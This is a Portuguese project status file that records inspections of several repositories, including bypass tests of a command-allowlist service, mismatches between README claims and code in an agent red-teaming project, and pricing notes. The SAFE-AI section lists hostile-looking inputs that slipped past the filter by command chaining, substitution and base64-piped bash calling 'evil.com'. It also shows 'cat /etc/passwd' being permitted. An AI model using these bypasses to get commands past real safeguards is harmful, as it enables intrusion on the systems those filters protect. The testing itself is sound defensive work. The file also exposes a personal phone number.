# STATE — Fase 0 (verificado em 2026-11-24)

Repos locais: `karen` (branch `feat/fase0`; branch estacionada
`docs/climara-pricing-and-leads` com 2 commits sem push), `climara-website`
(main), `climara-website-oficial` (main), `karen-backups` (main), `peda`
(master), e `PAI` (clone novo de `lucasmulato/PurpleAgenticInteligence`, main,
HEAD `13dbf2c`).

## SAFE-AI (inspecionado em 2026-11-24)
Repos clonados: `SAFE-AI` (`main`, `3351824`) e `LLM-SEC` (`master`, `db165a3`).
Docker não está instalado; equivalente usado: uvicorn local com
`ALLOWLIST_PATH=config/allowlist.yaml` e `AUDIT_DB_PATH=data/audit.db`,
venv em `/tmp/opencode/safeai-venv`.

- `/execute` com os 3 exemplos do README: PERMIT (`ls -la`), REJECT
  (`curl http://site-malicioso.com`), ASK_HUMAN (`rm -rf /tmp/cache`). `/audit`
  devolveu 3 registros. OK.
- Bypasses que passaram indevidamente como PERMIT (só o primeiro token é
  avaliado): `echo ... | base64 -d | bash`; `ls -la; curl evil.com`;
  `ls -la && curl evil.com`; `echo $(curl evil.com)`.
- Rejeitados corretamente: `sh -c "curl evil.com"`, `/bin/curl`, `alias c=curl; ...`,
  `$(curl evil.com)`, `python -c ...`, `CURL`, `bash -i`.
- `cat /etc/passwd` é PERMIT porque `cat` está na permit list — limitação de
  política, não bypass de parser.
- LLM-SEC: manter redação exata — CONF-2 (Reproducible) overall; CONF-3
  (Bounded Model Checking) for core protocol, TLC depth 10, 172.020 estados.
  Não aumentar o claim.

## Lacunas resolvidas / restantes
Resolvidas: URLs e clones de SAFE-AI/LLM-SEC, execução dos 3 exemplos e dos
testes de bypass. Restantes: confirmar "AI Safety Residency 2026"/"Private R&D";
definir escopo do suporte Climara; vídeo/GIF do demo; Lighthouse; EN do site.

## PAI — o que roda
- `python3 core/orchestrator.py` roda e imprime o loop Red → Blue → Guardian →
  "commit". `commit_patch()` **só imprime** — não grava `security_manifest.json`.
- Testes: `/tmp/opencode/pai-venv/bin/python -m pytest -q` em `/home/admin/PAI`
  → **1 falhou, 3 passaram**. A falha é `test_validate_latency_rejection`:
  `time.sleep(0.1)` não atinge o limite de 1200 ms, então o patch é APPROVED.
- Cobertura real: apenas `core/utility_guardian.py`. Sem testes para
  orchestrator, `recovery_manager`, servidores MCP, `rollback.sh` nem manifest.

## PAI — texto vs. código
- `config/ultrarag_pipeline.yaml` está **vazio**, apesar do checkbox
  "ART-T Integration" marcado como feito no README.
- Nomes trocados: `agents/mcp_red_server.py` declara `FastMCP("AgenticBlue")`;
  `agents/mcp_blue_server.py` declara `FastMCP("AgenticRed")`.
- "Corrigir em 1 minuto sem assinatura humana" é texto de visão; o código não
  implementa auto-aplicação e isso contradiz o portão da Karen.
- "Nash Equilibrium" é objetivo de pesquisa, não resultado medido.
- arXiv 2601.13518 = *AgenticRed: Evolving/Optimizing Agentic Systems for
  Red-Teaming* (verificado). arXiv 2512.13526 = *Async Control: Stress-testing
  Asynchronous Control Measures for LLM Agents* (verificado; código em
  `github.com/UKGovernmentBEIS/async-control` — afiliação "UK AISI" inferida
  do código, não explicitada no resumo).
- "AI Safety Residency 2026" e "Private R&D" em repo público: **a confirmar
  com Lucas**.
- Nome: usar **PAI** em todo o texto; repo não renomeado.

## Karen — saídas externas
- Fila de aprovação existe: `/api/dashboard/queue`, com itens de comando
  `severity: critical` / `policy: blocked` e conversas `blocked` (`queue.ts`).
- Saídas: e-mail SMTP para o próprio Lucas (`send-alert.mjs`,
  `send-morning-report.mjs`, `eva-weekly-review.mjs`); links `wa.me` de handoff
  manual (`outreach.ts`); HTTP REST somente em `/api/*` atrás de `auth_request`.
- Nenhum código de envio automático de mensagem a prospect foi encontrado.

## Climara — opções encontradas
- Essencial R$ 397 · Profissional R$ 997 · Premium R$ 1.697 (pagamento único).
- Mensalidade opcional de suporte: 15% do plano (R$ 59,55 / R$ 149,55 /
  R$ 254,55). Escopo do suporte ainda a definir.
- Site público segue **sem preço publicado**; publicar é Tier 2 (EQ-006).
- Contato/WhatsApp para o site: +5511988869469 (número pessoal do Lucas,
  provisório).
